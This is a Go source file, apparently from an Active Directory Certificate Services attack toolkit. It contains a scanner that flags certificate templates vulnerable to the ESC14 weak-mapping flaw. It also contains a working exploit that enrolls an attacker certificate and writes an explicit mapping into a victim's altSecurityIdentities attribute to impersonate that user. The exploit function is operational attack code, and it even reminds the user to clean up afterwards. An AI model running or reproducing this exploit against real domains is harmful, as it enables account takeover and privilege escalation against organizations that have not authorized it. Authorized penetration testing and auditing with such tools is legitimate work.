package pki

import (
	"context"
	"crypto"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"strings"

	"github.com/go-ldap/ldap/v3"
)

// ESC14Finding represents a template vulnerable to ESC14 (weak explicit certificate
// mappings via altSecurityIdentities). Older templates (schema version <= 1) do not
// enforce strong mapping, and when combined with UPN-based certificate mapping and
// weak binding enforcement, allow certificate-based impersonation.
type ESC14Finding struct {
	TemplateName          string `json:"template_name"`
	SchemaVersion         int    `json:"schema_version"`
	AllowsExplicitMapping bool   `json:"allows_explicit_mapping"`
	StrongMappingRequired bool   `json:"strong_mapping_required"`
	MappingMethods        uint32 `json:"mapping_methods"`
	BindingEnforcement    int    `json:"binding_enforcement"`
}

// ScanESC14 identifies templates vulnerable to ESC14 by checking for:
//   - Templates with schema version <= 1 (older templates that don't enforce strong certificate mapping)
//   - CertificateMappingMethods includes UPN mapping (0x04)
//   - StrongCertificateBindingEnforcement < 2 (not full enforcement)
//   - Templates with authentication EKUs
//
// ESC14 exploits the fact that older certificate templates (schema v1) allow explicit
// mappings via altSecurityIdentities without requiring the strong certificate binding
// introduced in KB5014754. An attacker with a certificate from a schema v1 template
// can set altSecurityIdentities on a target user to map their certificate to that user.
func ScanESC14(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn) ([]ESC14Finding, error) {
	fmt.Println("[*] Scanning for ESC14 (weak explicit mappings via altSecurityIdentities)...")

	// Check certificate mapping methods
	methods, err := CheckCertificateMapping(ctx, cfg, conn)
	if err != nil {
		fmt.Printf("[!] Could not determine certificate mapping methods: %v\n", err)
		fmt.Println("[*] Continuing scan with pre-patch default assumption (0x1F)")
		methods = certMapPrePatchDefault
	}

	upnEnabled := methods&certMapUPN != 0
	if !upnEnabled {
		fmt.Println("[+] ESC14: UPN mapping not enabled — explicit mapping attack path less viable")
		// Continue anyway — S4U2Self or subject mapping can also be relevant
	}

	// Check strong certificate binding enforcement (reuse ESC9's check)
	enforcement, err := CheckESC9Registry(cfg)
	if err != nil {
		fmt.Printf("[!] Could not determine binding enforcement: %v\n", err)
		fmt.Println("[*] Continuing scan — findings will note unknown enforcement")
		enforcement = -1
	}

	strongMappingRequired := enforcement == 2

	if strongMappingRequired {
		fmt.Println("[*] Full binding enforcement enabled — ESC14 significantly mitigated")
		fmt.Println("[*] Flagging schema v1 templates for completeness")
	}

	// Find templates with authentication EKUs and schema version <= 1
	templates, err := EnumerateTemplates(ctx, cfg, conn)
	if err != nil {
		return nil, fmt.Errorf("enumerate templates: %w", err)
	}

	var findings []ESC14Finding
	for _, tmpl := range templates {
		// ESC14 targets schema version <= 1 templates — these lack the strong mapping
		// enforcement fields (msPKI-Certificate-Policy) that schema v2+ templates have
		if tmpl.SchemaVersion > 1 {
			continue
		}

		// Must have authentication EKU to be useful for impersonation
		if !tmpl.AuthenticationEKU {
			continue
		}

		// Skip templates that require manager approval (harder to exploit)
		if tmpl.RequiresManagerApproval {
			continue
		}

		// Schema v1 + auth EKU + weak enforcement = ESC14
		finding := ESC14Finding{
			TemplateName:          tmpl.Name,
			SchemaVersion:         tmpl.SchemaVersion,
			AllowsExplicitMapping: true, // schema v1 always allows explicit mapping
			StrongMappingRequired: strongMappingRequired,
			MappingMethods:        methods,
			BindingEnforcement:    enforcement,
		}
		findings = append(findings, finding)

		status := "EXPLOITABLE"
		if strongMappingRequired {
			status = "mitigated (full enforcement)"
		} else if enforcement == -1 {
			status = "exploitable (enforcement unknown — assume vulnerable)"
		}

		fmt.Printf("[!] ESC14: %s — schema v%d + auth EKU + weak mapping [%s]\n",
			tmpl.Name, tmpl.SchemaVersion, status)
	}

	if len(findings) == 0 {
		fmt.Println("[+] ESC14: No schema v1 templates with authentication EKU found")
	} else {
		names := make([]string, 0, len(findings))
		for _, f := range findings {
			names = append(names, f.TemplateName)
		}
		fmt.Printf("[!] ESC14: %d vulnerable template(s): %s\n", len(findings), strings.Join(names, ", "))
	}

	return findings, nil
}

// ExploitESC14 exploits a schema v1 template and weak explicit mappings.
// The attacker enrolls for a valid certificate from the template, then
// writes an X509 explicit mapping (Issuer/Subject) to the victim's
// altSecurityIdentities LDAP attribute. This requires WriteProperty
// access to altSecurityIdentities on the victim object.
func ExploitESC14(ctx context.Context, cfg *ADCSConfig, conn *ldap.Conn, templateName, victimDN string) (*x509.Certificate, crypto.Signer, error) {
	fmt.Printf("[!] ESC14 Exploitation: template=%s victimDN=%s\n", templateName, victimDN)

	findings, err := ScanESC14(ctx, cfg, conn)
	if err != nil {
		return nil, nil, fmt.Errorf("ESC14 scan failed: %w", err)
	}

	vuln := false
	for _, f := range findings {
		if strings.EqualFold(f.TemplateName, templateName) {
			vuln = true
			break
		}
	}
	if !vuln {
		fmt.Printf("[!] Warning: Template %q was not detected as ESC14 vulnerable. Proceeding anyway...\n", templateName)
	}

	// Step 1: Enroll for a certificate as the attacker
	fmt.Printf("[*] Enrolling certificate using template %q...\n", templateName)
	cert, certKey, err := EnrollCertificate(cfg, templateName, cfg.Username, false)
	if err != nil {
		return nil, nil, fmt.Errorf("certificate enrollment failed: %w", err)
	}
	fmt.Printf("[+] Certificate obtained! Subject: %s\n", cert.Subject.String())

	// Step 2: Construct the X509 explicit mapping
	// Format: X509:<I>IssuerName<S>SubjectName
	// Note: LDAP expects a specific ordering (typically RDNs in reverse order compared to Go's default String(), 
	// but Go's String() often works depending on AD version, or we can use the exact format from the cert).
	// To be robust, we'll format it manually or use Go's string if it matches AD.
	// We'll use the raw string representation for now, assuming standard AD PKI formats.
	issuerStr := formatNameForAD(cert.Issuer)
	subjectStr := formatNameForAD(cert.Subject)
	mapping := fmt.Sprintf("X509:<I>%s<S>%s", issuerStr, subjectStr)

	fmt.Printf("[*] Adding explicit mapping to %s:\n    %s\n", victimDN, mapping)

	// Step 3: Write to altSecurityIdentities
	modReq := ldap.NewModifyRequest(victimDN, nil)
	modReq.Add("altSecurityIdentities", []string{mapping})
	
	if err := conn.Modify(modReq); err != nil {
		return nil, nil, fmt.Errorf("failed to write altSecurityIdentities (need WriteProperty on victim): %w", err)
	}

	fmt.Printf("[+] ESC14 successful! Certificate is now mapped to %s\n", victimDN)
	fmt.Printf("[*] NOTE: The mapping will persist. You must manually clean it up after exploitation:\n")
	fmt.Printf("    Remove '%s' from altSecurityIdentities on %s\n", mapping, victimDN)

	return cert, certKey, nil
}

// formatNameForAD formats an X.509 Name into the LDAP string format expected by AD
// for altSecurityIdentities (e.g., DC=com,DC=example,CN=Users...).
// Go's String() outputs in reverse (CN=Users,DC=example,DC=com).
func formatNameForAD(name pkix.Name) string {
	parts := strings.Split(name.String(), ",")
	for i, j := 0, len(parts)-1; i < j; i, j = i+1, j-1 {
		parts[i], parts[j] = parts[j], parts[i]
	}
	return strings.Join(parts, ",")
}

